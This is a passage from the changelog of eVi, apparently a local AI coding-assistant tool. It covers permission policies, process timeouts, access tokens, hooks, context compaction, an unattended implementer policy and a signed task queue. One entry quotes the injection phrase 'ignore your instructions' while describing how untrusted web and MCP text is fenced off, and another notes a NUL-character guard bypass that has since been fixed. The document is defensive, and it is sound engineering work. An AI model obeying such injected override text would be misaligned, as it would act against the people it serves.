  scheduler's own folder with every tool approved and checked only the
  answer, so a case that asserted what the run did couldn't pass there and
  a prompt that edited files edited that folder. They now run the same
  engine as `evi eval run`: each case in a throwaway workspace under the
  implementer policy, `runs`, `pass_rate`, `expected_fail`, behavioral
  assertions and the judge included, on your configured `[llm]` backend and
  model, with no hooks, memory or skills. A `workspace = "repo"` case uses
  the repository the server or scheduler was started in, when it is
  trusted. Every run keeps its report, so it shows up under "Latest results
  by model", which now reads the newest reports of each suite (a suite
  scheduled often can't push the others out), and two runs that finish in
  the same second keep both reports. The panel shows a spinner while a run
  goes on, marks expected failures and skipped cases, and names the model
  and backend. The web never runs the fake backend: `[llm] backend =
  "fake"` gets `409`, as a CLI-agent backend does, and `POST
  /api/evals/run` refuses a `backend` field and `self` (`400`). A
  scheduled eval's log header now says `# policy: implementer (each case in
  a throwaway workspace)` and names the model and the report, and its
  status counts the suite's cases, with expected failures and skips after
  them (`ok (5/6, 1 expected to fail)`, `fail (1/4, 3 skipped)`): a run that
  skipped any case is `fail`, since nobody is there to notice it checked
  less. See "Web / Desktop: the Evals panel" and "Scheduled evals" in
  docs/features/evals.md.
- **A release waits for the browser tests and its CHANGELOG entry.** 1.0.49
  reached PyPI with a dead button because a release ran only the unit suite.
  The e2e suite now gates the PyPI publish (and runs on every push to main),
  the tag must match the newest CHANGELOG entry, dated within a day, and the
  GHCR image is published by the release after PyPI instead of on the tag by
  itself. The desktop release runs the shell's Windows tests first and can run
  the native-desktop smoke tests (`EVI_DESKTOP_E2E=true`). CI also fails a
  workflow that pastes `${{ }}` into a script, and a change that adds a CLI
  command or web route without touching `docs/` (label `docs-skip` to waive).
  See docs/releasing.md and TESTING.md.
- **The `gemini` backend needs a Gemini API key or Vertex AI.** Since
  2026-06-18 Google no longer serves Gemini CLI to free, Google AI Pro and
  Google AI Ultra "Login with Google" accounts; those plans moved to Google's
  Antigravity CLI, which eVi doesn't drive. Set `GEMINI_API_KEY` (from
  https://aistudio.google.com/apikey) or Vertex AI
  (`GOOGLE_GENAI_USE_VERTEXAI=true` plus `GOOGLE_CLOUD_PROJECT` and
  `GOOGLE_CLOUD_LOCATION`, or `GOOGLE_API_KEY`); a Gemini Code Assist
  Standard / Enterprise login still works. eVi's errors and `evi doctor`
  explain the cut-off, a rejected key and a used-up quota. Settings → Model &
  Backend now labels the kinds `gemini — Gemini API key / Vertex AI` and
  `amp — Amp subscription`, and picking either shows its install command and
  how it signs in.
- **CLI-agent backends get the conversation on stdin, and Gemini no longer
  runs in `yolo`.** `gemini`, `qwen` and `copilot` took the whole chat as a
  command-line argument, which a Windows npm `.cmd` shim passes through
  `cmd.exe`: a chat over 8191 characters, or one with quotes, `&`, `%`, `|` or
  a newline, broke. They now read it from stdin, as `codex` and `amp` do.
  `gemini` ran with `--approval-mode yolo`, so in a chat turn it could run
  shell commands and write files on its own; it now runs with `default`, so
  tools that need approval are denied in a headless turn, and `qwen` is pinned
  to `default` too. Model ids are limited to letters, digits and
  `. _ : / @ + = -`. Delegate backends still run their own tools outside eVi's
  permission checks, so unattended runs now refuse them (see Security).
- **CLI-agent turns are time-bounded and leave nothing running.** `gemini`,
  `codex` and `claude_agent` turns had no time limit, and where there was one,
  only the direct child was killed: on Windows the `.cmd` shim's `node`
  grandchild kept running and held the output open. Turns now end with a
  clear error after 180 s for `gemini`, `qwen`, `copilot` and `amp`, and
  600 s for `codex` and `claude_agent`, and eVi kills the CLI's whole process
  tree. On Windows each run has its own Job Object, and the CLI only starts
  once it is inside, so everything it launches is in it too. On macOS/Linux
  the CLI leads its own session: Ctrl-C in the terminal no longer reaches it
  directly, and one still running when eVi exits is killed. If a CLI answers
  and exits but something it started still holds its output, that leftover
  is killed after 2 s and the answer is kept.
- **amp installs as `@ampcode/cli` and gains an `ultra` mode.** The docs and
  `evi doctor` now name `npm i -g @ampcode/cli` (it replaced the Sourcegraph
  package), and `--model ultra` (deepest reasoning, most credits) joins
  `low` / `medium` / `high`.
- **The managed llama.cpp runtime sizes its context window to your machine
  and keeps `context_size` in step.** Its server always ran with a 4096-token
  window while `[llm] context_size` kept its own value (32768 by default), so
  eVi compacted far too late and the server rejected long prompts. It now
  runs with 32768, 16384 or 8192 tokens, whatever fits next to the model in
  VRAM or in about 70% of RAM, and setup, a model switch, the GPU switch and
  every relaunch write that number into `config.toml`. Open web and desktop chats use the new window
  from their next message. Switching to another backend from the web or
  desktop app gives back the `context_size` you had before (or removes the
  key, so the default applies), unless you changed it since; a switch made
  with the CLI is given back at the next `evi web` or desktop start. A
  profile's or a trusted repository's `context_size` is never written into
  `config.toml`. `GET /api/runtime/status` and `GET /api/runtime/catalog`
  report the window as `ctx`.
- **The `[mcp]` extra needs mcp 1.30 or newer and admits up to 2.3.** The pin
  moved from `>=1.0,<2.1` to `>=1.30,<2.4`, and a new CI job runs the MCP
  tests on 1.30.x, 2.0.x and the newest allowed release, so installing or
  upgrading `evi-assistant[mcp]` may upgrade an older `mcp`.
- **Building the desktop shell needs Rust 1.90.** Tauri moved to 2.12.1 (wry
  0.57, tao 0.37), and the update channel's `base64`, `sha2` and `zip` crates
  to 0.23, 0.11 and 4. New tests check that a signed update still verifies,
  that a real archive passes the hash check and extracts, that a tampered or
  truncated one is refused, and that `../` entries can't escape. `toml` stays
  on 0.8: 1.x would silently ignore `[desktop] sidecar_auto_update = false`.
  Linux builds still carry `glib` 0.18.5 (RUSTSEC-2024-0429) until Tauri moves
  to gtk-rs 0.20; nothing in the shell uses the affected API.
- **Serving the network needs an access token, and the desktop app and the
  Docker image make their own.** With LAN access on (`[federation]
  bind_lan`), the desktop app generates a 256-bit token once, keeps it in
  `~/.evi/desktop-token` (readable only by you on macOS and Linux), hands it
  to its server and signs its own window in, so nothing changes on this
  machine. Peers and clients on other machines must send it
  (`evi web-config token show` prints it), and if no token can be made the
  app stays on loopback. A `[web] auth_token` you set is used instead, and
  the desktop window now signs itself in with that too. The Docker image's
  new entrypoint does the same when neither `EVI_WEB_AUTH_TOKEN` nor
  `[web] auth_token` is set: it keeps the token in the state volume as
  `container-token` and never logs it (print it with
  `docker exec <container> evi web-config token show`). Without one, the
  published port would refuse even your own browser, which reaches eVi
  through the Docker network. A token handed over at launch like these
  (`EVI_WEB_AUTH_TOKEN`) gates only other machines, so the image's own health
  check, and on the desktop an older VS Code extension, work without it; the
  server removes it from its environment so the tools it runs never see it.
  In thin-client mode (`EVI_REMOTE_URL`) the desktop app signs in with
  `EVI_REMOTE_TOKEN`, or with the token `peers.json` keeps for that server.
- **Desktop core-only updates need the latest desktop app.** The desktop app
  now hands its server the LAN token at launch (shell ABI 2), and cores
  published from this release on require that (`min_shell_abi = 2`). An
  older desktop app keeps the core it has and gets newer ones only after a
  full app update.
- **One turn per chat: a message sent mid-turn becomes a follow-up.** Two
  turns could run on one chat at once and interleave its history: a re-roll
  during a turn, a reload or a second window, or a slash command sent
  mid-turn (which also cleared the page's "turn running" state).
  `POST /api/chat` on a busy session now answers `409` naming
  `POST /api/session/<id>/steer`, and the web UI turns a plain message into a
  follow-up there. Re-roll, edit, truncate, `/api/reset` and every slash
  command except `/help`, `/tools` and `/model`, `/goal` or `/auto` without
  an argument also answer `409` until the turn ends. Scripts that call
  `/api/chat` should expect the `409`.
- **A permission prompt nobody answers is denied after 5 minutes.** The turn
  used to wait forever, leaving the chat busy. An unanswered prompt is now
  denied after 300 s (`[web] decision_timeout_s`, or `EVI_DECISION_TIMEOUT_S`,
  which overrides it): the stream sends a new `PermissionExpired` event, and
  the web UI closes the prompt and says so (`PermissionRequest` carries
  `timeout_s`). A closed tab doesn't deny early. The answer now goes to the
  chat that asked, so switching tabs while a prompt is open no longer loses
  it.
- **VS Code extension: a chat per window, and prompts you can answer.** Every
  window shared one server session (`vscode`), so two windows raced the same
  chat; each window now has its own, kept across reloads. A tool that needs
  approval shows Approve and Deny buttons (the extension ignored the prompt,
  so the turn waited), and errors and the "still working" `409` are shown.
  With `evi.authToken` unset, it signs in to a server on this machine with
  the desktop app's `~/.evi/desktop-token`.
- **Hooks run in the session folder, and a guard never judges a cut-off
  input.** A command hook now runs in the session folder (`/cd`, `--cwd`, the
  web folder chip) and gets it as `EVI_CWD` (a URL hook gets `cwd`), so a
  "stay in this folder" guard resolves a relative path the way the tool
  does; a hook that relied on the folder eVi started in sees the session
  folder when one is set. Its stdin is the null device, so a hook that reads
  stdin no longer waits until its timeout. `EVI_HOOK_ARGS_JSON` holds a
  payload whole up to what one environment variable can (about 32,000
  characters on Windows, 120 KiB elsewhere). Past that, a guard
  (`veto_on_nonzero`) isn't run and the action is blocked, while other hooks
  get a shortened copy with `EVI_HOOK_ARGS_TRUNCATED=1` and the whole payload
  in the temp file `EVI_HOOK_ARGS_FILE` names. The new `args_via_file = true`
  key always writes that file, so a guard can check input of any size. eVi
  used to pass a payload whole however big, so on Windows a guard like the
  `no-system-writes` example in `examples/hooks.toml` now blocks a
  `write_file` over about 32,000 characters until you add `args_via_file`
  and read the file. A guard also blocks when eVi's hook runner itself
  fails, and a NUL character, which let a prompt past its guard or crashed
  the turn, reaches the hook as `\u0000`; a hook that only observes never
  blocks. See "Big payloads" in docs/features/hooks.md.
- **A skill's `allowed-tools` and `disallowed-tools` now take effect.** eVi
  read them but never applied them. After `invoke_skill`, a call outside the
  skill's scope is refused (`not allowed by the active skill's scope`) for
  the rest of the turn, including calls in the same batch as `invoke_skill`
  and subagents the turn spawns, and the refused call is never put to a
  permission prompt. The tool list the model sees doesn't change. A second
  skill can only narrow the scope, and the next turn (or a re-roll) starts
  without one. Claude Code tool names in imported skills are mapped to eVi's
  (`Read` → `read_file`, `Bash(…)` → `run_command`, `Grep` →
  `search_files`, …), and an allow-list that names no tool eVi knows
  (`TodoWrite`) is ignored rather than locking out every tool.
- **`evi web-config token show` prints the token a server here uses.** It
  printed only `[web] auth_token`; when that is unset it now falls back to
  `EVI_WEB_AUTH_TOKEN`, then the Docker image's `container-token`, then the
  desktop app's `desktop-token`. Only the token goes to stdout, so
  `$(evi web-config token show)` works; where it came from goes to stderr.
  `token rotate` no longer asks for a restart: a running server re-reads
  `config.toml` on every request, so the old `[web] auth_token` stops working
  at once (a launch token stays valid until its server restarts). `evi web`
  no longer suggests the nonexistent `evi web token rotate`.
- **`evi run` and `evi batch` never wait on a prompt, `-y` included.** Under
  `-y` a command the destructive-command guard flags, or a protected write,
  could still stop a scripted run at a terminal prompt; it is now denied.
  Without `-y` a call that would ask is still denied unless you set
  `[auto] unattended_policy = "allow"`. Their JSON output gains `policy`.
- **Scheduled tasks are built like every other agent.** A scheduled run now
  goes through `build_agent`, so safe mode, your `hooks.toml` and your
  guardrails apply to it (a hook you wrote now also sees scheduled runs); it
  still gets no project context. In safe mode `evi web` and the desktop app
  don't start the scheduler. A run whose turn failed recorded `ok`; the
  status is now `ok`, `denied: …`, `error: <message>` or, for a run that
  couldn't start, `ERROR: …`. `evi schedule run-now` prints it, and
  `evi scheduler` prints the policy its jobs run under.
- **The web app's workflow and recipe runs no longer approve every tool.**
  `POST /api/dispatch/workflow/{name}` and `POST /api/recipes/run` (Dispatch
  and Settings → Routes & Recipes) follow `[auto] unattended_policy` and
  return the `policy` they ran under; the panels don't show it yet.
  `evi workflow run` still approves every tool of every step.
- **Settings, `evi lint` and `evi doctor` point out a list that still runs
  code unasked.** Settings → Permissions lists `code_read` apart from `code`,
  each with a line on what it lets run without asking. When the saved list
  still holds the old default's `code`, a **Running code is approved without
  asking** banner offers **Switch to code_read**, which saves your list with
  `code_read` in place of `code` at once (it applies to new chats). `evi lint`
  and `evi doctor`'s new `code execution approval` check warn about such a
  list and print the `auto_approve = [...]` line to use. A list with
  `code_read` beside `code` keeps running code unasked on purpose and isn't
  flagged. `GET` and `POST /api/config` gain `auto_approve_migration`.
- **Notes wait for the turn to end, show as notes and survive a revive.** A
  note that arrived during a turn was added at once, possibly between a tool
  call and its result, which strict backends reject; it now joins the history
  when the turn ends, after the turn's own messages. Notes are written to the
  transcript, so a chat revived from disk (the desktop app reopened) keeps
  them. The web chat draws notes and the compaction summary as notes, without
  Edit, Re-roll, Branch or Delete (the summary collapsed, its acknowledgement
  hidden), and catches up on new notes after each turn and before each
  message you send. A re-roll after a note regenerates the reply before it
  and keeps the note, after the new reply; it used to drop the note.
  `GET /api/session/<id>/history` gains `kind`, `held`, `length` and
  `?since=<index>`. See "Notes and compaction in the chat" in
  docs/features/web-desktop.md.
- **Compaction keeps the history valid and is kept in the transcript.** The
  summary went in as a second system message, which Gemma and Mistral
  templates reject, and the kept part could start with a tool result whose
  call had been summarised away. The summary is now a user message followed by
  an assistant acknowledgement, the cut moves to the start of a turn (or to
  the nearest step when that would keep too little), and a `compaction` record
  goes to the transcript, so a web or desktop chat revived from disk comes
  back as the model last saw it. `evi sessions list` and `evi stats` don't
  count the record as a message; `evi sessions show` and fine-tune export
  still read every message.
- **A command the agent runs can no longer hang a turn or outlive it.**
  `run_command`, `run_python` and `monitor` killed only the direct child at
  their timeout, and on Windows then waited for a grandchild that still held
  the output, so one command could hang a turn for good. Each now runs as the
  root of its own process tree: at the timeout, or when the turn is stopped,
  the whole tree is killed and the output so far comes back
  (`ERROR: command timed out after 60s; its process tree was killed. Output so
  far: …`). A command that exits while a background job it started still
  holds its output returns 2 s later and leaves that job running, with a note
  saying so. Commands get no stdin, so one that waits for input reads
  end-of-file instead of the terminal. On Windows they run in their own
  process group: a Ctrl+C in eVi's console reaches eVi, which decides what to
  stop. Commands still running when eVi exits (Ctrl+C at `evi serve` or
  `evi scheduler`) are stopped with it instead of holding up the exit.
- **`evi mcp serve` serves only `memory`, `calendar` and `web` beside the new
  `agent` category.** While a task run goes on, the server process works in
  the task's worktree (as `evi task start` does), so a git, index, file, code
  or shell tool served next to the task API would read or change the run's
  unfinished work as if it were the repository. `evi mcp serve --categories
  git,agent`, or any other category together with `agent`, now exits 2 with
  one line saying so, and `evi mcp serve-config` refuses the same lists.
  Serve the other categories from a second `evi mcp serve`. The fix ledger's
  tools (`record_fix`, `search_fixes`) stay with the served repository. See
  "The agent category" in docs/features/mcp.md.
- **`evi review` reads the tracked checklist and your own guidance
  together.** `.evi/REVIEW.md`, the checklist a repository tracks, and
  `.evi/BUGBOT.md`, your own, now both load (then the learned rules); before,
  the first one found won, so a local `BUGBOT.md` silently hid the tracked
  checklist, in the `evi task verify` review gate too. Run in a subfolder,
  `evi review` now reads the repository top's `.evi/`, and `evi
  review-remember` writes its rule there.

### Added
- **`edit_file` recovers from the near misses small models make.** An edit
  whose only difference is whitespace or indentation (spaces for tabs, a
  dropped or flattened indent, trailing spaces) is applied when exactly one
  block matches, re-indented the way the file indents it, and the result
  says so. A re-sent edit that is already in the file succeeds as "already
  applied". A miss names the closest lines of the file; an ambiguous match
  names the line of each occurrence.
- **`write_file` won't overwrite a file the model hasn't read.** Small models
  rewrite a whole file from memory and drop what they forgot (in our own
  shakedown, seven tests). In a chat or run, `write_file` now refuses to
  replace an existing file unless the model read it with `read_file` this
  session and nothing changed it since (a command, an editor, another tool);
  the refusal shows how the file begins and says to read it or use
  `edit_file`. New files, and files the model itself wrote or edited, need no
  read; `edit_file` and `apply_patch` need none either. Called outside an
  agent (a script calling the tool function), nothing is checked.
- **eVi repairs the tool calls small models get wrong, and says so.** Each
  call is fitted to its tool once, before the permission check, the policy,
  hooks and the tool see it (new `evi/tools/repair.py`, `Tool.prepare`):
  arguments in single quotes, with Python's `True`/`None` or with raw
  newlines inside a string are read; a number, boolean or list sent as text
  (`"offset": "5"`) becomes the type the tool takes; `file_path`/`filename`
  become `path` and `cmd` becomes `command`; an argument the tool doesn't
  take is dropped. The result ends with what eVi changed. Arguments cut off
  mid-object are closed for a read-only tool only, never for one that
  writes. A call that still can't be used, or lacks a required argument, is
  answered with how to call the tool (`read_file(path: string, offset?:
  integer, ...)` and an example) instead of a Python error, and a call to an
  unknown tool names the close ones ("Did you mean: read_file?"). A reply
  that starts with a call written as `<tool_call>{...}</tool_call>` (Hermes,
  Qwen2.5) or `<function=NAME><parameter=KEY>...` (Qwen3-Coder) text runs
  it; one shown inside prose never runs.
- **`find_files`, `search_files`, `list_dir` and the index skip what
  `.gitignore` and `.eviignore` ignore.** Build output and generated files no
  longer fill searches or get embedded; `list_dir` says how many entries it
  hid, and pointing a tool at an ignored file or folder still shows it. The
  rules are a plain gitignore subset (new `evi/ignore.py`); a malformed line
  is skipped, and patterns with many wildcards stay fast.
- **Attached images are downscaled and stripped of EXIF before they go to a
  vision model.** With Pillow installed, a JPEG, PNG or WEBP is turned upright,
  its longer side capped at `[vision] max_px` (1568; 0 = never) and re-encoded
  without camera, time or GPS data. Without Pillow the bytes go as before.
- **llama.cpp discovery also finds a server on port 9931**, llama-server's new
  default, after the configured port and the ten after it.
- **An eval baseline records the sampling it was measured with.** `evi eval
  baseline record` stores temperature, top_p and context size, and a run at
  other settings lists each one in the report's mismatch warnings.
- **`evi task submit --director`** hands a task to review when the director
  finished its work on the task branch after the implementer's attempts; a
  signed reviewer note says so.
- **A run that keeps repeating a failing call now stops instead of using up
  its turns.** When one tool call fails the same way three times (same tool
  and arguments, same output apart from numbers such as timings) with no
  successful write in between, the third result tells the model so and the
  run ends with `stop_reason` `loop_detected` (exit 3). Editing and
  re-running a failing test never trips it.
- **A run that is out of turns, or stopped by the loop guard, ends with a
  hand-off instead of mid-work.** The turn's last model round trip now runs
  with no tools and a note asking what is done, what is not done yet and
  the next step; a run the loop guard stops gets one such round trip to
  report what it tried. The stop reasons and exit codes are unchanged
  (`max_turns`, `loop_detected`, exit 3), and the project checks don't run
  on that last step: a run out of turns never counts as done. Subagents and
  task runs get the same.
- **eVi fits the conversation into the window the server really runs the
  model with.** When Ollama (a loaded model), llama-server or LM Studio (a
  loaded model) reports a smaller window than `[llm] context_size`, that
  window is the ceiling: auto-compaction, `/context` and the usage display
  use it, so a long chat is compacted instead of having its start silently
  dropped by the server. Asked at most once a minute (new
  `Backend.context_window`); a silent or unreachable server leaves
  `context_size` in charge.
- **`/context` counts the tool schemas sent with every request.** A new
  "tool schemas" row in `/context` and the web usage popover, and in the CLI
  a line breaking it down per tool category and per MCP server (largest
  first), so the tools filling a small window are easy to find and switch
  off. `GET /api/session/{id}/context` returns it as `buckets.schemas` and
  `schema_groups`.
- **A long tool round no longer overflows the window, and an overflow error
  no longer ends the turn.** The context budget is checked before every
  request instead of only at the end of a turn, counting the tool schemas
  and correcting eVi's ~4 chars/token estimate with the backend's own
  `prompt_tokens`; the history is compacted first when the next prompt would
  fill `compact_when_pct` of the window. When a backend refuses a prompt as
  too long (OpenAI's `context_length_exceeded`, llama-server, LM Studio), eVi
  compacts and sends it again, once; a second refusal is the turn's error. A
  prompt that fills the server's reported window (Ollama cuts silently) is
  flagged. New stream events: `ContextCompacted`, `ContextTruncated`.
- **MCP tools work with OpenAI-style backends.** An MCP tool is named
  `<server>.<tool>`, and OpenAI-compatible APIs refuse a tool name with a dot
  (or over 64 characters), so every request failed once an MCP server was on.
  Tools now go to the model under provider-safe names (`github__search`; a
  long or clashing name gets a short hash) that are the same on every turn,
  with their schemas normalized for providers and local grammars (`$ref`
  inlined, `allOf` merged, "X or null" made optional); the model's call maps
  back to the real tool, so permissions, hooks and logs see `github.search`
  (new `evi/toolschema.py`).
- **Compaction keeps what a model needs to carry on, and no longer nests
  summaries.** A compaction summary now has fixed headings (Objective,
  Decisions, Done, In progress, Files, Blockers, Next step) instead of one
  paragraph, and a later compaction updates the earlier summary instead of
  summarising it again inside the new one. `/compact <focus>` in the REPL
  and the web chat says what to keep, word for word. New `[llm]
  compaction_model` names the model that writes summaries (empty: the chat
  model).
- **One big tool result can't fill a small model's window any more.** A
  result longer than about 15% of the context window (a long log, a big file
  slice, an MCP dump) now enters the conversation as its head and tail
  (more tail for command and test output), with the whole of it in a spill
  file under `<eVi home>/tool-output/` that the model can page with
  `read_file`; secrets are redacted in it, and old spill files are deleted at
  startup (after `[tools] cleanup_period_days`, or 14 days). With an 8K
  window a result is held to about 1.2K tokens.
- **Web pages, MCP replies and calendar invites reach the model fenced as
  untrusted.** Their text goes inside `<untrusted source="...">` …
  `</untrusted>` (a look-alike tag in the text can't close it), and the
  system prompt says fenced text is information, never instructions, so a
  page that says "ignore your instructions" reads as what it is. A plugin or
  SDK tool opts in with `trust="untrusted"`.
- **Old tool results are masked before anything is summarised.** Past 60% of
  the window (and on an overflow), tool results from before your last two
  messages become short stubs naming a spill file that holds each whole
  result, which costs no summary call and loses nothing `read_file` can't
  bring back; compaction follows only if that wasn't enough. `/compact
  --fast` runs just this pass. `ContextCompacted` gains the reason `mask`.
- **The Companion: an opt-in, safe-scoped proactive watcher (Duet-style).**
  The always-on personal agents (Claude Duet, OpenAI Dots, Meta Muse) check
  your sources every few hours, brief you each morning and speak up only when
  something needs you; eVi had the parts (scheduler, notifications, Telegram,
  calendar, MCP, memory, default-deny unattended runs) but no loop. With
  `[companion] enabled = true` in your own config.toml (`evi companion on`,
  or the switch in Settings → Companion; a repository's `.evi.toml` can't
  switch it on, a profile can only switch it off) the scheduler in `evi
  scheduler` or `evi web` runs a check-in every `check_every_hours` and a
  brief at `brief_at`. A check-in reads only the sources you list
  (`calendar`, `memory`, or a named `mcp:<server>:<tool>`) under the new
  read-only `watcher` policy, treats everything it reads as untrusted data,
  skips the model when nothing changed, and must answer in a strict JSON
  shape; plain code then dedupes the items, keeps them in a feed and
  notifies only those at or above `notify_min_priority`, outside
  `quiet_hours` and under `max_notifications_per_day` (held ones go out
  later), through `[notify]` and, opt-in, an outbound-only Telegram message.
  It changes nothing by itself: a proposed action names a tool from
  `allowed_actions` (empty by default: suggest-only) and runs once, exactly
  as stored, only when you approve it, after its expiry, argument hash,
  permission rules and your hooks are checked again; a shell line,
  `run_python`, subagents, money-moving or deleting tools, destructive
  commands, protected and relative paths are never proposed. Everything is
  in a redacted `audit.jsonl`. New: `evi companion
  status|on|off|check|brief|feed|proposals|approve|reject|instructions`
  (approve prints the exact call and asks y/N; refused from a process an
  eVi agent started), the Settings → Companion panel (feed, approval cards
  with a second-click confirm, instructions editor, Check now) and the
  owner-only `/api/companion/*` routes. Saving `[companion]` through the web
  app now re-syncs the running server's scheduler. See
  docs/features/companion.md.
- **`evi run` reports what a run did, can stream it as it goes, and can pick
  up a past session.** A script, a CI job or a task loop had the answer and
  little else, so it couldn't tell which tools ran, what changed or why a
  run ended without scraping text. `--format json` now prints a run report
  (`schema_version` 1): the session and its transcript, the backend, model
  and working folder and that folder's trust state, the turns used and
  allowed, `stop_reason` and `done_reason`, the answer, every tool call with
  its arguments, status, duration and output (redacted, then cut to 2000
  characters), the tools the permission checks denied, token usage summed
  over the run, how long it took and the files it changed
  (`files_changed`, with line counts: from `git status` in a work tree, a
  bounded scan of the folder elsewhere, eVi's own output left out). The new
  `--format stream-json` prints one JSON object per line as the run goes:
  `RunStart` (the session id comes first), the turn's events, and
  `RunResult`, the report, last, even after an error or a Ctrl+C. Every line
  carries `schema_version`, `kind`, `seq` and `ts`, the same envelope the
  web UI's SSE stream now sends, and both validate against one JSON Schema
  (`evi.events.SCHEMA`). New flags: `--max-turns`, `--cwd`/`-C` (that
  folder's `.evi.toml` applies only if it is trusted), `--model`,
  `--backend` (a saved backend; a delegate CLI-agent one is refused as
  usual), and `--resume`/`-r` ID or `--continue`/`-c` (the most recently
  active session, in any folder) to add the run to a past session. `evi
  batch` takes `--max-turns`, and each of its lines is the item's `id` and
  `prompt` plus its run report. See "The run report" in
  docs/features/structured-and-batch.md.
- **Runs, team tasks, workflow steps and subagents can work in a git worktree
  of their own.** An agent editing the checkout eVi runs from could break eVi
  in the middle of its task, and teammates or parallel steps edited the same
  files. `evi run --worktree <branch|auto>` now runs in
  `<repo>/.worktrees/<branch>` (`auto`: a fresh `fix-1`, `fix-2`, …;
  `--base REF` picks where a new branch starts), so the checkout you work in
  is never touched. The worktree is the run's folder (its `EVI.md`, and its
  `.evi.toml` when the repository is trusted, which its worktrees share),
  and the run report's new `worktree` field lists the branch, the commits,
  what is left uncommitted and the diffstat. `evi team run --worktree` gives
  each task a `fix-<task id>` worktree, a workflow step's
  `isolate = "worktree"` (every step with `evi workflow run --worktree`) gives
  the step one, and an `agents.toml` profile's `isolate = "worktree"` is
  honoured by `delegate`. A branch checked out elsewhere, or one that differs
  from an existing branch only in case, is refused; worktrees always go under
  the main checkout, never nested; a running isolated run keeps its worktree
  locked; and nothing is ever merged back. Team tasks, workflow steps and
  subagents share eVi's process, so they run without `monitor`, the git tools
  and MCP tools (which act in eVi's own folder) and refuse delegate CLI-agent
  backends; anything that can't be isolated fails instead of running in your
  checkout. The web app's Dispatch refuses a workflow with an isolated step
  (`400`) for now. `evi worktree chat` takes `--mode`. See "Isolated runs" in
  docs/features/agents.md and "The run report" in
  docs/features/structured-and-batch.md.
- **`evi run --policy implementer` lets an unattended run change code and
  run its tests, and nothing else.** An unattended run had two settings:
  deny every call that would ask (so no shell, and no tests), or `-y` and
  allow everything. Under the implementer policy every call is allowed or
  denied with a reason, never asked: reads and edits inside the run's folder
  (the worktree with `--worktree`, else the repository's top level), shell
  lines whose every command is on a short allowlist (`pytest`, `ruff check`
  / `ruff format`, `python -m pytest` / `ruff`, `npm test`,
  `cargo check|test|clippy` and read-only git) with arguments that stay in
  the folder (pytest and ruff take no `@file` argument, whose contents the
  policy couldn't check), and nothing else: no network, MCP tools,
  `run_python`, memory or subagents. `hard_deny`, `deny` rules and the
  director's ground still deny first; `allow` rules, `yolo` and `unattended_policy` never widen it;
  the destructive-command guard is always on. A protected file is editable
  only when a `--scope GLOB` entry names it (`.github/workflows/ci.yml` or
  `.github/workflows/*.yml`, not `**`), and `.evi/tasks/**`, `.git`, eVi's
  home, the director's key and secret files never are. In a folder you
  haven't trusted the policy runs no commands at all, since tests, git and
  even `python -m ruff` can run the folder's code. The run report's `policy`
  says `implementer`, and every denied call in `tool_calls` now carries its
  `reason`. An unknown policy, `--policy` with `-y` and a `--scope` entry
  outside the folder are usage errors (exit 2). It is a guardrail, not a
  sandbox: the tests run the repository's code, so give the run a
  `--worktree`. See "Implementer policy" in
  docs/features/permissions-and-sandbox.md.
- **A turn that changed files has to pass the project's checks before it
  ends.** Small models declare success early, and only a check that ran
  tells you otherwise. When the model would end a turn that changed files,
  eVi now runs ruff on the changed `.py` files, only the tests that cover
  them (each changed test file, and `tests/test_<module>.py`), `npm test` or
  `cargo check` when JS/TS or Rust changed, and your own `[checks]
  commands`, and hands any failure back to the model with the end of its
  output. After `[checks] max_rounds` failing rounds (default 2) the run
  stops with the new stop reason `checks_failed`, and `evi run` exits 5 (the
  `evi-run` action reports it too). It is on by default under
  `--policy implementer`; `[checks] verify = "always"` adds Code-mode
  sessions, where each check asks through the normal permission flow, and
  `"off"` turns it off. Checks never run in a folder you haven't trusted
  (the report's new `checks_skipped` says why); a trusted repository can add
  its own `[checks] commands` in `.evi.toml`. Each check is time-capped
  (`timeout`, 300 s), stops with the turn, gets no API keys in its
  environment, and its output is redacted. The run report's `checks` lists
  every run (command, exit code, the end of its output, round), `evi run`
  prints a line per check on stderr, the event stream gains `CheckResult`,
  `ChecksSkipped`, `ChecksFailed` and `FilesChanged`, and the web chat shows
  each check, a failing round as a note, and the files the turn's tools
  wrote in a footer under the reply. See "Verify before done" in
  docs/configuration.md.
- **A stop hook can send the model back to work.** A `stop` hook could only
  watch a turn end, so a gate such as "the tests must pass" couldn't stop a
  model that quit early. A `[[stop]]` hook with `protocol = "json"` now gets
  the event as JSON on stdin (session, folder, which attempt to finish this
  is, the files changed) and blocks by printing
  `{"decision": "block", "reason": "…"}` or exiting 2. The reason reaches the
  model as a note and the turn goes on, at most `[hooks] max_blocks` times
  per turn (default 3); one more block ends it with `stop_hook_exhausted`,
  and `evi run` exits 6. A hook that errors or times out never blocks, and
  plain `stop` hooks stay notifications. The run report gains `stop_blocks`,
  the event stream `StopBlocked`, and the web chat shows a block as a note
  in the conversation. A run's `text` is now the answer the model gave after
  the last block or failing check round, so `--schema` still gets one JSON
  object. `examples/hooks/pytest-gate.toml` is a ready gate that blocks
  while the tests the turn touched fail. See "Blocking stop hooks" in
  docs/features/hooks.md.
- **`evi task` keeps a task queue in the repository: eVi implements a task
  in a worktree of its own, proves it with the task's checks and stops, and
  only your signature marks it verified.** Handing eVi a fix meant writing a
  brief for `evi run` and keeping track yourself of what was asked, what ran
  and who accepted it. `evi task new` files a task in `.evi/tasks/<id>.toml`,
  tracked in git, with its acceptance criteria, `files_in_scope` and
  required checks (`--from FILE` reads them from a TOML file). In a trusted
  repository, `evi task start <id>` claims it with a lease (240 minutes,
  `--ttl`), opens branch `task/<id>` in `.worktrees/task__<id>` and runs it
  under the implementer policy with the verify gate on, on `--backend` /
  `--model` or your configured backend. A delegate CLI-agent backend is
  refused, whatever `allow_cli_agent_unattended` says. eVi then runs the
  task's required checks itself, writes the run report (with a `task`
  section) to `~/.evi/tasks/`, and leaves the task `implemented`, or `open`
  with the attempt counted. Its exit code is `evi run`'s, and 2 means nothing
  ran: an untrusted repository, someone else's live lease, a worktree that
  can't be opened. Nothing is committed: you review and commit the work on
  the branch, `evi task submit` it, and `evi task verify` runs the review
  gate (`evi review --multi --exit-code` on the branch's diff) and signs the
  task with your director key, which `evi attest init` makes once (`evi
  attest status` shows its id). `evi task reject --reason` signs a
  rejection, and `evi task reopen` sends a task back for another attempt.
  Verify and reject refuse, writing nothing, in any process an eVi agent may
  have started, and verify wants the task's worktree at the branch head with
  nothing uncommitted, so the signature covers the work you reviewed.
  `evi task list` and `evi task show` (`--format json`) show a verdict only
  with a valid signature at the branch's current head: a hand-written,
  re-edited or outdated `verified` reads `unverified (…)`. `evi task claim`
  and `evi task release` manage leases; an expired lease can be reclaimed.
